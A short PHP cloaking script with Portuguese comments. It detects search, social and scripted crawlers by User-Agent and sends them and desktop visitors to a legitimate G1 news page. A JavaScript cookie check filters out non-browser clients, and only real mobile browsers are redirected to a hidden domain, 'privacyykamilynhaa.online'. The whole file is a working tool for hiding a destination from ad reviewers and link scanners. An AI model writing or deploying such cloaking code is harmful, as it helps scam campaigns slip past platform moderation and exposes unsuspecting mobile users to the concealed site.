
<?php
function isBot($userAgent) {
    $bots = [
        'facebookexternalhit', 'Facebot', 'Googlebot', 'Bingbot', 'Slurp',
        'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'crawler',
        'spider', 'bot', 'WhatsApp', 'python-requests', 'curl'
    ];
    foreach ($bots as $bot) {
        if (stripos($userAgent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

function isMobile($userAgent) {
    return preg_match('/Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i', $userAgent);
}

// Início da lógica
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];

// Se for bot ou estiver em PC
if (isBot($userAgent) || !isMobile($userAgent)) {
    header("Location: https://g1.globo.com/rj/sul-do-rio-costa-verde/");
    exit;
}

// Se o cookie "js_enabled" ainda não está setado, forçamos recarregamento via JS
if (!isset($_COOKIE['js_enabled'])) {
    echo '<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Verificando...</title>
<script>
    document.cookie = "js_enabled=1; max-age=300; path=/";
    window.location.reload();
</script>
<noscript>
    <meta http-equiv="refresh" content="0;url=https://g1.globo.com/rj/sul-do-rio-costa-verde/">
</noscript>
</head><body></body></html>';
    exit;
}

// Se passou por tudo, redireciona para o conteúdo real
header("Location: https://privacyykamilynhaa.online/");
exit;
?>
